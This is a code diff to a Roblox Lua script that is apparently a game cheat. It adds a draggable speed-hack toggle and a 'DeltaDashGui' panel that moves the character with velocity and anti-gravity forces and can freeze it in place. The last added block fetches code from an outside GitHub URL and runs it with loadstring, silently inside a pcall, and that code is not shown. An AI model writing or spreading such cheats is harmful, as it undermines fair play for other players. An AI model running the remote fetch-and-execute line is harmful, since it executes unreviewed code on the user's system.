@@ -20,6 +20,7 @@ task.spawn(function()
     local Players = game:GetService("Players")
     local RunService = game:GetService("RunService")
     local TweenService = game:GetService("TweenService")
+    local UserInputService = game:GetService("UserInputService")
 
     local LocalPlayer = Players.LocalPlayer
 
@@ -51,16 +52,36 @@ task.spawn(function()
     ScreenGui.ResetOnSpawn = false
     ScreenGui.IgnoreGuiInset = true
 
+    local SpeedContainer = Instance.new("Frame")
+    SpeedContainer.Size = UDim2.new(0, 160, 0, 65)
+    SpeedContainer.Position = UDim2.new(0.05, 0, 0.2, 0)
+    SpeedContainer.BackgroundTransparency = 1
+    SpeedContainer.BorderSizePixel = 0
+    SpeedContainer.Parent = ScreenGui
+
+    local SpeedHandle = Instance.new("Frame")
+    SpeedHandle.Name = "SpeedHandle"
+    SpeedHandle.Size = UDim2.new(1, 0, 0, 18)
+    SpeedHandle.Position = UDim2.new(0, 0, 0, 0)
+    SpeedHandle.BackgroundColor3 = Color3.fromRGB(0, 200, 255)
+    SpeedHandle.BorderSizePixel = 0
+    SpeedHandle.Active = true
+    SpeedHandle.Parent = SpeedContainer
+
+    local HandleCorner = Instance.new("UICorner")
+    HandleCorner.CornerRadius = UDim.new(0, 6)
+    HandleCorner.Parent = SpeedHandle
+
     local ToggleBtn = Instance.new("TextButton")
-    ToggleBtn.Size = UDim2.new(0, 160, 0, 45)
-    ToggleBtn.Position = UDim2.new(0.05, 0, 0.2, 0)
+    ToggleBtn.Size = UDim2.new(1, 0, 0, 45)
+    ToggleBtn.Position = UDim2.new(0, 0, 0, 20)
     ToggleBtn.BackgroundColor3 = Color3.fromRGB(15, 20, 30)
     ToggleBtn.Text = "SPEED 35 : OFF"
     ToggleBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
     ToggleBtn.TextSize = 14
     ToggleBtn.Font = Enum.Font.GothamBold
     ToggleBtn.Active = true
-    ToggleBtn.Parent = ScreenGui
+    ToggleBtn.Parent = SpeedContainer
 
     local BtnCorner = Instance.new("UICorner")
     BtnCorner.CornerRadius = UDim.new(0, 8)
@@ -78,12 +99,12 @@ task.spawn(function()
 
     ToggleBtn.Activated:Connect(function()
         speedEnabled = not speedEnabled
-        
+
         if speedEnabled then
             ToggleBtn.Text = "SPEED 35 : ON"
             TweenService:Create(ToggleBtn, TweenInfo.new(0.2), {BackgroundColor3 = Color3.fromRGB(10, 50, 35)}):Play()
             TweenService:Create(BtnStroke, TweenInfo.new(0.2), {Color = Color3.fromRGB(0, 255, 150)}):Play()
-            
+
             speedConnection = RunService.Heartbeat:Connect(function()
                 local char = LocalPlayer.Character
                 if char and char:FindFirstChildOfClass("Humanoid") then
@@ -94,16 +115,45 @@ task.spawn(function()
             ToggleBtn.Text = "SPEED 35 : OFF"
             TweenService:Create(ToggleBtn, TweenInfo.new(0.2), {BackgroundColor3 = Color3.fromRGB(15, 20, 30)}):Play()
             TweenService:Create(BtnStroke, TweenInfo.new(0.2), {Color = Color3.fromRGB(0, 200, 255)}):Play()
-            
+
             if speedConnection then
                 speedConnection:Disconnect()
                 speedConnection = nil
             end
-            
+
             local char = LocalPlayer.Character
             if char and char:FindFirstChildOfClass("Humanoid") then
                 char:FindFirstChildOfClass("Humanoid").WalkSpeed = defaultSpeed
             end
+        end
+    end)
+
+    local dragging = false
+    local dragStartPos, startPos
+
+    SpeedHandle.InputBegan:Connect(function(input)
+        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
+            dragging = true
+            dragStartPos = input.Position
+            startPos = SpeedContainer.Position
+        end
+    end)
+
+    UserInputService.InputChanged:Connect(function(input)
+        if dragging and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
+            local delta = input.Position - dragStartPos
+            SpeedContainer.Position = UDim2.new(
+                startPos.X.Scale,
+                startPos.X.Offset + delta.X,
+                startPos.Y.Scale,
+                startPos.Y.Offset + delta.Y
+            )
+        end
+    end)
+
+    UserInputService.InputEnded:Connect(function(input)
+        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
+            dragging = false
         end
     end)
 end)
@@ -262,3 +312,410 @@ task.spawn(function()
     end)
 end)
 
+task.spawn(function()
+    pcall(function()
+        local Players = game:GetService("Players")
+        local RunService = game:GetService("RunService")
+        local TweenService = game:GetService("TweenService")
+        local UserInputService = game:GetService("UserInputService")
+
+        local player = Players.LocalPlayer
+        local playerGui = player:WaitForChild("PlayerGui")
+
+        if playerGui:FindFirstChild("DeltaDashGui") then
+            playerGui.DeltaDashGui:Destroy()
+        end
+
+        local screenGui = Instance.new("ScreenGui")
+        screenGui.Name = "DeltaDashGui"
+        screenGui.ResetOnSpawn = false
+        screenGui.Parent = playerGui
+
+        local mainFrame = Instance.new("Frame")
+        mainFrame.Name = "MainFrame"
+        mainFrame.Size = UDim2.new(0, 100, 0, 116)
+        mainFrame.Position = UDim2.new(0.8, 0, 0.5, -58)
+        mainFrame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+        mainFrame.BorderSizePixel = 0
+        mainFrame.Active = true
+        mainFrame.Draggable = true
+        mainFrame.Parent = screenGui
+
+        local uiCornerMain = Instance.new("UICorner")
+        uiCornerMain.CornerRadius = UDim.new(0, 8)
+        uiCornerMain.Parent = mainFrame
+
+        local uiStrokeMain = Instance.new("UIStroke")
+        uiStrokeMain.Thickness = 2
+        uiStrokeMain.Color = Color3.fromRGB(255, 255, 255)
+        uiStrokeMain.Parent = mainFrame
+
+        local handle = Instance.new("Frame")
+        handle.Name = "Handle"
+        handle.Size = UDim2.new(0, 20, 0, 40)
+        handle.Position = UDim2.new(0.5, -10, 0, -40)
+        handle.BackgroundColor3 = Color3.fromRGB(255, 165, 0)
+        handle.BorderSizePixel = 0
+        handle.ZIndex = 3
+        handle.Parent = mainFrame
+
+        local uiCornerHandle = Instance.new("UICorner")
+        uiCornerHandle.CornerRadius = UDim.new(0, 4)
+        uiCornerHandle.Parent = handle
+
+        local speedInput = Instance.new("TextBox")
+        speedInput.Name = "SpeedInput"
+        speedInput.Size = UDim2.new(1, 0, 0, 28)
+        speedInput.Position = UDim2.new(0, 0, 0, 0)
+        speedInput.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+        speedInput.TextColor3 = Color3.fromRGB(0, 0, 0)
+        speedInput.PlaceholderColor3 = Color3.fromRGB(120, 120, 120)
+        speedInput.PlaceholderText = "speed"
+        speedInput.Text = ""
+        speedInput.TextSize = 13
+        speedInput.Font = Enum.Font.SourceSansBold
+        speedInput.BorderSizePixel = 0
+        speedInput.Parent = mainFrame
+
+        local uiCornerTop = Instance.new("UICorner")
+        uiCornerTop.CornerRadius = UDim.new(0, 8)
+        uiCornerTop.Parent = speedInput
+
+        local dashButton = Instance.new("TextButton")
+        dashButton.Name = "DashButton"
+        dashButton.Size = UDim2.new(1, 0, 0, 40)
+        dashButton.Position = UDim2.new(0, 0, 0, 28)
+        dashButton.BackgroundColor3 = Color3.fromRGB(220, 50, 50)
+        dashButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+        dashButton.TextSize = 15
+        dashButton.Font = Enum.Font.SourceSansBold
+        dashButton.Text = "🥱👍🤝"
+        dashButton.BorderSizePixel = 0
+        dashButton.Parent = mainFrame
+
+        local lockButton = Instance.new("TextButton")
+        lockButton.Name = "LockButton"
+        lockButton.Size = UDim2.new(1, 0, 0, 28)
+        lockButton.Position = UDim2.new(0, 0, 0, 68)
+        lockButton.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+        lockButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+        lockButton.TextSize = 14
+        lockButton.Font = Enum.Font.SourceSansBold
+        lockButton.Text = "🙅"
+        lockButton.BorderSizePixel = 0
+        lockButton.Parent = mainFrame
+
+        local uiCornerBot = Instance.new("UICorner")
+        uiCornerBot.CornerRadius = UDim.new(0, 8)
+        uiCornerBot.Parent = lockButton
+
+        local isExpanded = true
+
+        local function toggleMenu()
+            isExpanded = not isExpanded
+            local targetSize = isExpanded and 116 or 20
+            local tweenInfo = TweenInfo.new(0.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
+            local sizeTween = TweenService:Create(mainFrame, tweenInfo, {Size = UDim2.new(0, 100, 0, targetSize)})
+            sizeTween:Play()
+
+            speedInput.Visible = isExpanded
+            dashButton.Visible = isExpanded
+            lockButton.Visible = isExpanded
+        end
+
+        local dragging = false
+        local dragStartPos = nil
+        local mainFrameStartPos = nil
+
+        handle.InputBegan:Connect(function(input)
+            if input.UserInputType == Enum.UserInputType.Touch or input.UserInputType == Enum.UserInputType.MouseButton1 then
+                dragging = true
+                dragStartPos = input.Position
+                mainFrameStartPos = mainFrame.Position
+            end
+        end)
+
+        handle.InputChanged:Connect(function(input)
+            if dragging and (input.UserInputType == Enum.UserInputType.Touch or input.UserInputType == Enum.UserInputType.MouseMovement) then
+                local delta = input.Position - dragStartPos
+                mainFrame.Position = UDim2.new(
+                    mainFrameStartPos.X.Scale,
+                    mainFrameStartPos.X.Offset + delta.X,
+                    mainFrameStartPos.Y.Scale,
+                    mainFrameStartPos.Y.Offset + delta.Y
+                )
+            end
+        end)
+
+        handle.InputEnded:Connect(function(input)
+            if input.UserInputType == Enum.UserInputType.Touch or input.UserInputType == Enum.UserInputType.MouseButton1 then
+                local distance = (input.Position - dragStartPos).Magnitude
+                if distance < 10 then
+                    toggleMenu()
+                end
+                dragging = false
+            end
+        end)
+
+        local isDashing = false
+        local isLocked = false
+        local dashSpeed = 70
+
+        local savedWalkSpeed = 16
+        local savedJumpPower = 50
+        local savedAutoRotate = true
+
+        local animateScript
+        local animationStates = {}
+
+        local dashConnection = nil
+        local lockConnection = nil
+
+        local currentAttachment = nil
+        local currentLinearVelocity = nil
+        local currentAntiGravity = nil
+
+        local lockedCFrame = nil
+
+        local function captureDefaults(humanoid)
+            if humanoid then
+                if humanoid.WalkSpeed > 0 then savedWalkSpeed = humanoid.WalkSpeed end
+                if humanoid.JumpPower > 0 then savedJumpPower = humanoid.JumpPower end
+                savedAutoRotate = humanoid.AutoRotate
+            end
+        end
+
+        local function restoreState()
+            local character = player.Character
+            if character then
+                local humanoid = character:FindFirstChildOfClass("Humanoid")
+                if humanoid then
+                    humanoid.WalkSpeed = savedWalkSpeed
+                    humanoid.JumpPower = savedJumpPower
+                    humanoid.AutoRotate = savedAutoRotate
+
+                    humanoid:SetStateEnabled(Enum.HumanoidStateType.Jumping, true)
+                    humanoid:SetStateEnabled(Enum.HumanoidStateType.Freefall, true)
+                    humanoid:SetStateEnabled(Enum.HumanoidStateType.FallingDown, true)
+                end
+            end
+        end
+
+        speedInput.FocusLost:Connect(function()
+            local val = tonumber(speedInput.Text)
+            if val then
+                dashSpeed = val
+            else
+                speedInput.Text = ""
+            end
+        end)
+
+        local function stopAnimations(character)
+            local humanoid = character:FindFirstChildOfClass("Humanoid")
+            if humanoid then
+                for _, track in ipairs(humanoid:GetPlayingAnimationTracks()) do
+                    animationStates[track] = track.IsPlaying
+                    track:Stop(0)
+                end
+            end
+            animateScript = character:FindFirstChild("Animate")
+            if animateScript then animateScript.Disabled = true end
+        end
+
+        local function restoreAnimations(character)
+            if animateScript and animateScript.Parent == character then
+                animateScript.Disabled = false
+            end
+            local humanoid = character:FindFirstChildOfClass("Humanoid")
+            if humanoid then
+                for track, wasPlaying in pairs(animationStates) do
+                    if track and track.Parent and wasPlaying then
+                        pcall(function() track:Play(0) end)
+                    end
+                end
+            end
+            animationStates = {}
+            animateScript = nil
+        end
+
+        local function stopDash()
+            if dashConnection then
+                dashConnection:Disconnect()
+                dashConnection = nil
+            end
+
+            if currentLinearVelocity then currentLinearVelocity:Destroy() currentLinearVelocity = nil end
+            if currentAntiGravity then currentAntiGravity:Destroy() currentAntiGravity = nil end
+            if currentAttachment then currentAttachment:Destroy() currentAttachment = nil end
+
+            isDashing = false
+            dashButton.Text = "🥱👍🤝"
+            dashButton.BackgroundColor3 = Color3.fromRGB(220, 50, 50)
+
+            local character = player.Character
+            if character then restoreAnimations(character) end
+
+            if not isLocked then
+                restoreState()
+            end
+        end
+
+        local function startDash()
+            if isDashing then
+                stopDash()
+                return
+            end
+
+            local character = player.Character
+            if not character then return end
+
+            local humanoid = character:FindFirstChildOfClass("Humanoid")
+            local hrp = character:FindFirstChild("HumanoidRootPart")
+            if not humanoid or not hrp then return end
+
+            if not isLocked then
+                captureDefaults(humanoid)
+            end
+
+            isDashing = true
+            dashButton.Text = "🥱👍🤝"
+            dashButton.BackgroundColor3 = Color3.fromRGB(150, 20, 20)
+
+            humanoid.WalkSpeed = 0
+            humanoid.JumpPower = 0
+
+            humanoid:SetStateEnabled(Enum.HumanoidStateType.Jumping, false)
+            humanoid:SetStateEnabled(Enum.HumanoidStateType.Freefall, false)
+            humanoid:SetStateEnabled(Enum.HumanoidStateType.FallingDown, false)
+
+            stopAnimations(character)
+
+            currentAttachment = Instance.new("Attachment")
+            currentAttachment.Parent = hrp
+
+            currentLinearVelocity = Instance.new("LinearVelocity")
+            currentLinearVelocity.Attachment0 = currentAttachment
+            currentLinearVelocity.RelativeTo = Enum.ActuatorRelativeTo.World
+            currentLinearVelocity.MaxForce = math.huge
+            currentLinearVelocity.Parent = hrp
+
+            currentAntiGravity = Instance.new("VectorForce")
+            currentAntiGravity.Attachment0 = currentAttachment
+            currentAntiGravity.RelativeTo = Enum.ActuatorRelativeTo.World
+            currentAntiGravity.ApplyAtCenterOfMass = true
+            currentAntiGravity.Force = Vector3.new(0, hrp.AssemblyMass * workspace.Gravity, 0)
+            currentAntiGravity.Parent = hrp
+
+            local fixedY = hrp.Position.Y
+
+            dashConnection = RunService.PreRender:Connect(function()
+                if not isDashing then return end
+
+                local char = player.Character
+                if not char or not char.Parent then
+                    stopDash()
+                    return
+                end
+
+                local hum = char:FindFirstChildOfClass("Humanoid")
+                local root = char:FindFirstChild("HumanoidRootPart")
+                if not hum or hum.Health <= 0 or not root then
+                    stopDash()
+                    return
+                end
+
+                hum.WalkSpeed = 0
+                hum.JumpPower = 0
+
+                for _, track in ipairs(hum:GetPlayingAnimationTracks()) do
+                    track:Stop(0)
+                end
+
+                local moveDir = hum.MoveDirection
+                local targetDirection = (moveDir.Magnitude > 0) and moveDir or root.CFrame.LookVector
+
+                local heightDiff = fixedY - root.Position.Y
+
+                if currentLinearVelocity and currentLinearVelocity.Parent then
+                    currentLinearVelocity.VectorVelocity = Vector3.new(
+                        targetDirection.X * dashSpeed,
+                        heightDiff * 15,
+                        targetDirection.Z * dashSpeed
+                    )
+                end
+
+                if currentAntiGravity and currentAntiGravity.Parent then
+                    currentAntiGravity.Force = Vector3.new(0, root.AssemblyMass * workspace.Gravity, 0)
+                end
+            end)
+        end
+
+        dashButton.MouseButton1Click:Connect(startDash)
+
+        local function stopLock()
+            if lockConnection then
+                lockConnection:Disconnect()
+                lockConnection = nil
+            end
+
+            isLocked = false
+            lockButton.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+
+            if not isDashing then
+                restoreState()
+            end
+        end
+
+        local function toggleLock()
+            if isLocked then
+                stopLock()
+                return
+            end
+
+            local character = player.Character
+            if not character then return end
+            local hrp = character:FindFirstChild("HumanoidRootPart")
+            local humanoid = character:FindFirstChildOfClass("Humanoid")
+            if not hrp or not humanoid then return end
+
+            if not isDashing then
+                captureDefaults(humanoid)
+            end
+
+            isLocked = true
+            lockButton.BackgroundColor3 = Color3.fromRGB(0, 180, 80)
+            lockedCFrame = hrp.CFrame
+
+            lockConnection = RunService.PreRender:Connect(function()
+                if not isLocked then return end
+
+                local char = player.Character
+                if not char then return end
+                local root = char:FindFirstChild("HumanoidRootPart")
+                local hum = char:FindFirstChildOfClass("Humanoid")
+
+                if root and hum then
+                    root.AssemblyLinearVelocity = Vector3.zero
+                    root.AssemblyAngularVelocity = Vector3.zero
+
+                    hum.WalkSpeed = 0
+                    hum.JumpPower = 0
+
+                    hum:ChangeState(Enum.HumanoidStateType.Running)
+
+                    local currentLook = root.CFrame.LookVector
+                    lockedCFrame = CFrame.new(lockedCFrame.Position, lockedCFrame.Position + currentLook)
+                    root.CFrame = lockedCFrame
+                end
+            end)
+        end
+
+        lockButton.MouseButton1Click:Connect(toggleLock)
+    end)
+end)
+
+task.spawn(function()
+    pcall(function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/objwghd-maker/12HB/refs/heads/main/script%20Lua"))()
+    end)
+end)
